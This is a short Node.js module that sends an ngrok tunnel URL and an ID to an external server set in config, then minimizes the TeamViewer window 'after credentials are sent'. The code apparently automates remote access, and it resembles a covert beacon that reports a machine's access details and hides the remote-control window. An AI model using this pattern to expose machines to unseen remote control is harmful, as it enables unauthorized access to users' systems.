// src/modules/ngrokSender.mjs
import fetch from 'node-fetch';
import { NGROK_CONFIG } from '../config.mjs'; // Import the config values
import { minimizeTeamViewerWindow } from './processManager.mjs'; // Import the minimize function


// Function to send Ngrok URL via HTTP request to the external server
export async function sendNgrokUrl(ngrokUrl) {
  try {
    const { _id, authToken, externalServerUrl } = NGROK_CONFIG; // Destructure config values

    const payload = `${_id} | ${ngrokUrl}`;

    const requestOptions = {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': authToken, // Use the authToken from config
      },
      body: JSON.stringify({ payload }), // Send the payload in the body
    };

    const response = await fetch(externalServerUrl, requestOptions); // Use externalServerUrl from config

    if (response.ok) {
      const resJson = await response.json();
      console.log('Response from external server:', resJson);

      // Minimize TeamViewer after credentials are sent
      minimizeTeamViewerWindow();
      
    } else {
      console.error('Failed to send Ngrok URL:', response.statusText);
    }
  } catch (error) {
    console.error('Error sending Ngrok URL to external server:', error);
  }
}
